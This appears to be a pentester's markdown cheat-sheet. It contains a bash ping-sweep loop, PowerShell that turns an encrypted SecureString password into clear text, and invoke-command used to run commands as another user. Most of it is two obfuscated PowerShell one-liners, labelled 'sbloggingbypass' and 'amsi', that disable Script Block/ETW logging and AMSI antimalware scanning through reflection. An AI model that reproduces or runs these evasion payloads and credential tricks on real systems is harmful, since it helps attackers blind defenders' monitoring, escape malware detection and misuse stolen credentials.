# ps
ps = ping sweep

just some note will add here
# 
```bash
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
```

#
convert encrypted powershell password into clear text:
```powershell
$pwd = ConvertTo-SecureString <encrypted text here>
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "User",$pwd
$cred.GetNetworkCredential()
```
to Execute Command in powershell as another user without runasCs :
```powershell
invoke-command -Computername localhost -Credential $cred -ScriptBlock { whoami }
```
note: you might find yourself in more restriction for using invoke-command rather than RunasCs 


```powershell
sbloggingbypass:
sET-ITEm  ("VaRIaBLe"+":"+"Fi90x"+"K") ([TYPE]("{3}{2}{0}{1}"-F'iOn.','aSSEmbLy','LECt','REF') )  ;  seT-ITEM VariAble:6Dj9k8  ([TYPE]("{0}{1}"-F'R','Ef')) ;    ( ChIldiTem  ("VARIAblE"+":"+"Fi90X"+"K")  ).valuE::"l`o`AdwIThPa`Rti`AlnamE"."I`NvO`ke"(('S'+("{1}{0}"-f'tem','ys')+'.C'+'ore'))."g`E`TTYPE"(('Sys'+("{1}{0}"-f'i','tem.D')+("{0}{1}" -f 'agn','o')+("{2}{0}{1}" -f'ics.Ev','ent','st')+'i'+("{0}{2}{1}" -f 'ng.Ev','ov','entPr')+'i'+'der'))."gET`FI`eLd"(('m'+'_'+("{1}{0}"-f'd','enable')),(("{1}{0}" -f 'nP','No')+'ubl'+'ic'+("{1}{0}{3}{2}"-f 'Inst',',','e','anc')))."seTVa`l`Ue"( (ChiLditeM  vAriAblE:6Dj9K8).vALuE."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+("{0}{1}" -f '.','Mana')+'ge'+("{1}{0}{2}"-f 't.Au','men','t')+'o'+("{2}{0}{1}{3}" -f 'n.Tr','acin','matio','g.')+("{0}{2}{1}"-f 'PS','Lo','Etw')+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+("{1}{0}" -f'vid','Pro')+'er'),('N'+'o'+'nPu'+'b'+("{2}{1}{0}" -f'c','tati','lic,S')))."gE`Tva`lUe"(${Nu`Ll}),0)

amsi:
.('sv')  ("{1}{0}" -f 'o','hq')  ( [Type]("{1}{0}"-F'EF','r')) ;${a} =  (  .('lS')  ("{2}{3}{0}{1}" -f'Le:Hq','O','v','aRiAb') )."vAl`Ue"."aS`SEmbLy".("{0}{2}{1}" -f 'GetT','s','ype').Invoke();ForEach(${B} in ${A}) {if (${B}."N`Ame" -like ("{1}{2}{0}" -f 'ils','*i','Ut')) {${c} = ${b}}};${d} = ${C}.("{0}{1}{2}"-f 'GetFiel','d','s').Invoke(("{2}{1}{3}{0}" -f'ic','onPublic,S','N','tat'));ForEach(${E} in ${D}) {if (${E}."Na`ME" -like ("{2}{1}{0}"-f'd','aile','*F')) {${F} = ${e}}};${F}.("{1}{2}{0}"-f'e','SetVal','u').Invoke(${Nu`LL},${T`RUE})
```
